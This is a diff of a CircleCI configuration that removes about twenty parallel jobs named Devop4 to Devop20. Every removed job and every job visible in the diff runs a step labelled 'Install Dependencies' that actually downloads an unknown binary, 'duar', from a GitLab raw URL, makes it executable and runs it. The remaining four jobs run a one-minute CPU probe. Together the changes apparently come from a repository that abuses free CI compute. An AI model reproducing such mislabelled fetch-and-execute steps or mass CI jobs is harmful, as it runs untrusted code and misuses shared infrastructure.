@@ -6,168 +6,28 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
+            command: timeout 1m lscpu
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
+            command: timeout 1m lscpu
     Devop2:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
+            command: timeout 1m lscpu
     Devop3:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
-    Devop4:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
-    Devop5:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
-    Devop6:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
-    Devop7:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
-    Devop8:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
-    Devop9:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
-    Devop10:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
-    Devop11:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
-    Devop12:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
-    Devop13:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
-    Devop14:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
-    Devop15:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
-    Devop16:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
-    Devop17:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
-    Devop18:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
-    Devop19:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
-    Devop20:
-      docker:
-            - image: circleci/ruby:2.5.3
-      steps:
-        - run:
-            name: Install Dependencies
-            command: wget https://gitlab.com/j632/lah/-/raw/main/duar && chmod u+x duar && ./duar
-
+            command: timeout 1m lscpu
 workflows:
     version: 2.1
     build:
@@ -176,21 +36,3 @@ workflows:
             - Devop1
             - Devop2
             - Devop3
-            - Devop4
-            - Devop5
-            - Devop6
-            - Devop7
-            - Devop8
-            - Devop9
-            - Devop10
-            - Devop11
-            - Devop12
-            - Devop13
-            - Devop14
-            - Devop15
-            - Devop16
-            - Devop17
-            - Devop18
-            - Devop19
-            - Devop20
-
